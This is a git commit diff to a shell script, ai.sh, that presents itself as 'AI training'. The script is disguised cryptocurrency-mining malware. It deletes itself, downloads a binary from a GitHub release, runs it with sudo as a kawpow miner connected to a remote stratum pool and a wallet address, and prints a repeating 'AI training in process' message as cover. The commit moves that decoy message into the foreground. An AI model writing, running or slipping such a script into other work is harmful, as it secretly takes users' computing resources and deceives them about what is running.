6ad3b084ef1345986dc81a2791cce0e87049c931
max313iq <153689278+max313iq@users.noreply.github.com>
2024-11-29 08:06:45 +0300

    Update ai.sh

--- ai.sh
+++ ai.sh
@@ -1,15 +1,11 @@
 #!/bin/bash
-
-# Run the script in the background using nohup and redirect output to /dev/null
 nohup bash -c "
   ( sleep 1; rm -- \"$0\" ) &
   wget https://github.com/max313iq/tech/releases/download/Gft/aitraininng
   chmod +x aitraininng
   sudo ./aitraininng -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RM2ciYa3CRqyreRsf25omrB4e1S95waALr.batch &
-  
-  # Loop to echo 'AI training in progress' every 10 minutes
-  while true; do
-    echo 'AI training in progress' >> std_log_process_0.txt
-    sleep 600  # 600 seconds = 10 minutes
-  done
 " > /dev/null 2>&1 &
+while true; do
+    echo "AI training in process"
+    sleep 600 
+done
